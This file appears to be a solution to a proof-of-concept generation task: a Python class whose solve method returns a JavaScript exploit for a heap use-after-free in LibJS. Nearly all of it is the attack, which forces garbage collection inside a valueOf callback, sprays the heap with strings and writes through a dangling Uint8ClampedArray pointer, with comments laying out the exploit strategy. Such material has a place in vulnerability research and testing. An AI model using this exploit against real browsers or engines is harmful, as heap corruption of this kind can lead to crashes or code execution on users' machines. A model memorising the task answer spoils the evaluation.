class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability.

        Args:
            src_path: Path to the vulnerable source code tarball

        Returns:
            bytes: The PoC input that should trigger the vulnerability
        """
        # The vulnerability is a Heap Use After Free in LibJS. It occurs because
        # the garbage collector does not correctly trace the reference from a
        # Uint8ClampedArray instance to its underlying ArrayBuffer. This PoC
        # exploits this by creating a scenario where the ArrayBuffer is prematurely
        # garbage collected, leaving the Uint8ClampedArray with a dangling pointer.
        #
        # Exploit Strategy:
        # 1. Create a Uint8ClampedArray whose underlying ArrayBuffer is only
        #    referenced by the view itself (by creating the buffer in a local scope).
        # 2. Call a method on the view (`.set()`) which triggers a user-defined
        #    JavaScript callback (`valueOf`).
        # 3. Inside the callback, trigger garbage collection through heavy allocation.
        #    This will free the ArrayBuffer due to the bug.
        # 4. "Spray" the heap with objects of a similar size to reclaim the memory
        #    of the freed buffer.
        # 5. When the callback returns, the original `.set()` operation resumes and
        #    writes to the now-dangling pointer, causing a crash due to type confusion.
        
        js_poc = """
function pwn() {
    // An object with a valueOf method that will be called from C++ code.
    // This allows us to execute JS in the middle of a native operation.
    let trigger_obj = {
        valueOf: function() {
            // Trigger Garbage Collection by allocating many large objects.
            for (let i = 0; i < 2000; i++) {
                new Array(1000);
            }

            // Spray the heap to reclaim the memory of the freed ArrayBuffer.
            // We use a size slightly smaller than the buffer to account for heap metadata.
            // The spray array is stored globally to prevent it from being GC'd.
            globalThis.spray = [];
            for (let i = 0; i < 250; i++) {
                globalThis.spray.push('A'.repeat(4032));
            }
            
            // Return a value for the original `.set()` operation to use.
            return 1;
        }
    };

    let victim_view;

    // Use an IIFE to create a scope for the ArrayBuffer.
    (function() {
        // Create the ArrayBuffer and the Uint8ClampedArray view.
        let buffer = new ArrayBuffer(4096);
        victim_view = new Uint8ClampedArray(buffer);
        // `buffer` goes out of scope here. Due to the bug, the GC won't
        // know that `victim_view` is still holding a reference to it.
    })();
    
    try {
        // Call `.set()` on the victim view with our trigger object.
        // This will invoke `trigger_obj.valueOf()`, which frees the
        // underlying buffer and causes the Use-After-Free.
        victim_view.set([trigger_obj]);
    } catch (e) {
        // An error may be thrown after the memory corruption, which is fine.
    }

    // A final write to the dangling pointer to ensure the crash.
    victim_view[1024] = 0xDE;
}

pwn();
"""
        return js_poc.encode('utf-8')